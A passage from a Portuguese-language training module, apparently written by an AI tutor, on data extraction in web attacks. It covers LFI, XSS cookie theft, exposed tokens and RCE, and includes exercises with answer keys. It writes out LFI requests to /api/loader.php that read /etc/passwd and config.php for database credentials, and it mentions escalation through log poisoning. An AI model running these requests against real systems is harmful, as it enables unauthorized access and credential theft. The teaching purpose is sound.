# Resultado: Acesso como administrador
# → Pode extrair todos os dados administrativos
```

**Dados Extraídos:**
- ✅ Cookie de sessão de administrador
- ✅ Token de autenticação
- ✅ Acesso completo ao painel administrativo
- ✅ Todos os dados acessíveis como admin

---

## 🎯 2.5 - Fluxo de Extração de Dados

### Fluxo Geral

```
1. RECONHECIMENTO
   ↓
   Identificar vulnerabilidades
   (LFI, XSS, Token Exposto, RCE)

2. EXPLORAÇÃO
   ↓
   Explorar vulnerabilidade
   (Injetar payload, acessar arquivos, usar tokens)

3. EXTRAÇÃO
   ↓
   Extrair dados sensíveis
   (Credenciais, arquivos, sessões, bancos de dados)

4. ANÁLISE
   ↓
   Analisar dados extraídos
   (Identificar informações valiosas, credenciais, padrões)

5. ESCALAÇÃO (Opcional)
   ↓
   Usar dados extraídos para obter mais acesso
   (Login com credenciais, uso de tokens, acesso a mais dados)
```

### Exemplo Prático: Fluxo Completo

**Cenário:** Extração de dados via LFI

```
PASSO 1: RECONHECIMENTO
→ Identificar endpoint vulnerável: /api/loader.php?f=

PASSO 2: EXPLORAÇÃO
→ Testar acesso a arquivos: /api/loader.php?f=/etc/passwd
→ Confirmar vulnerabilidade LFI

PASSO 3: EXTRAÇÃO
→ Extrair config.php: /api/loader.php?f=config.php
→ Extrair /etc/passwd: /api/loader.php?f=/etc/passwd
→ Extrair código-fonte: /api/loader.php?f=index.php

PASSO 4: ANÁLISE
→ Analisar config.php → Encontrar credenciais de banco
→ Analisar /etc/passwd → Encontrar usuários do sistema
→ Analisar código-fonte → Identificar outras vulnerabilidades

PASSO 5: ESCALAÇÃO
→ Usar credenciais para acessar banco de dados
→ Extrair todos os dados de usuários
→ Potencialmente escalar para RCE via log poisoning
```

---

## 📝 RESUMO DO MÓDULO 2

### Conceitos Aprendidos:

✅ **Extração de Dados:** Processo de obter informações sensíveis sem autorização  
✅ **Tipos de Dados Sensíveis:** Credenciais, PII, Arquivos do Sistema, Sessões  
✅ **Técnicas Principais:** LFI, Token Exposto, XSS, RCE  
✅ **Casos Reais:** Exemplos práticos do relatório Fastfoodhackings  
✅ **Fluxo de Extração:** Reconhecimento → Exploração → Extração → Análise → Escalação  

### Próximos Passos:

No **Módulo 3**, vamos aprofundar em **Escalação de Privilégios** - como funciona, técnicas específicas e como dados extraídos podem levar à escalação.

---

## 🏋️ EXERCÍCIOS PRÁTICOS - MÓDULO 2

### Exercício 1: Identificação de Dados Sensíveis

Classifique os seguintes dados por categoria:

a) Hash de senha armazenado em banco de dados  
b) Email e telefone de um usuário  
c) Arquivo `/etc/passwd` do servidor  
d) Cookie de sessão `session_id=abc123`  
e) Token de API `Bearer xyz789`  

**Resposta:**
- a) **Credenciais e Autenticação** (Hash de senha)
- b) **Dados Pessoais (PII)** (Email e telefone)
- c) **Arquivos do Sistema** (Arquivo do sistema operacional)
- d) **Informações de Sessão** (Cookie de sessão)
- e) **Credenciais e Autenticação** (Token de API)

---

### Exercício 2: Técnicas de Extração

Identifique qual técnica seria usada para extrair cada dado:

a) Extrair arquivo `config.php` do servidor  
b) Roubar cookie de sessão de um usuário  
c) Obter token de API exposto no JavaScript  
d) Acessar banco de dados completo após RCE  

**Resposta:**
- a) **LFI (Local File Inclusion)** - Acesso direto a arquivos do servidor
- b) **XSS (Cross-Site Scripting)** - Roubo de cookies via JavaScript
- c) **Exposição de Tokens** - Análise de código-fonte JavaScript
- d) **RCE (Remote Code Execution)** - Execução de comandos no servidor

---

### Exercício 3: Fluxo de Extração

Ordene os passos do fluxo de extração de dados:

1. Análise dos dados extraídos
2. Exploração da vulnerabilidade
3. Reconhecimento de vulnerabilidades
4. Escalação usando dados extraídos
5. Extração de dados sensíveis

**Resposta:**
1. **Reconhecimento** de vulnerabilidades
2. **Exploração** da vulnerabilidade
3. **Extração** de dados sensíveis
4. **Análise** dos dados extraídos
5. **Escalação** usando dados extraídos

---

### Exercício 4: Caso Prático

Descreva como um atacante poderia extrair credenciais de banco de dados usando FFHK-013 (LFI):

**Resposta Sugerida:**
```
1. Atacante identifica vulnerabilidade LFI em /api/loader.php?f=
2. Atacante tenta acessar arquivo de configuração: /api/loader.php?f=config.php
3. Se funcionar, arquivo config.php é retornado com credenciais
4. Atacante extrai: DB_HOST, DB_USER, DB_PASS, DB_NAME
5. Atacante usa credenciais para acessar banco de dados diretamente
6. Atacante extrai todos os dados armazenados no banco
```

---

### Exercício 5: Impacto de Extração

Explique o impacto de extrair cada tipo de dado:

a) Credenciais de banco de dados  
b) Cookie de sessão de administrador  
c) Token de API exposto  
d) Arquivo /etc/passwd  

**Resposta:**
- a) **Credenciais de banco:** Acesso completo ao banco de dados → Extração de todos os dados armazenados → Potencial modificação de dados
- b) **Cookie de admin:** Acesso como administrador → Controle da aplicação → Acesso a funcionalidades administrativas
- c) **Token de API:** Acesso não autorizado a APIs → Extração de dados via API → Potencial acesso administrativo
- d) **/etc/passwd:** Lista de usuários do sistema → Enumeração de contas → Base para ataques de brute force

---

## ✅ MÓDULO 2 CONCLUÍDO!

Parabéns! Você completou o Módulo 2 - Extração de Dados - Conceitos e Técnicas.

**Você agora entende:**
- ✅ O que é extração de dados e por que é perigoso
- ✅ Tipos de dados sensíveis e suas categorias
- ✅ Técnicas principais de extração (LFI, XSS, Tokens, RCE)
- ✅ Casos reais do relatório Fastfoodhackings
- ✅ Fluxo completo de extração de dados

---

## ❓ TEM ALGUMA PERGUNTA?

Antes de continuarmos para o **Módulo 3: Escalação de Privilégios - Fundamentos**, você tem alguma dúvida sobre o Módulo 2?

**Quando estiver pronto, me avise e continuamos! 🚀**

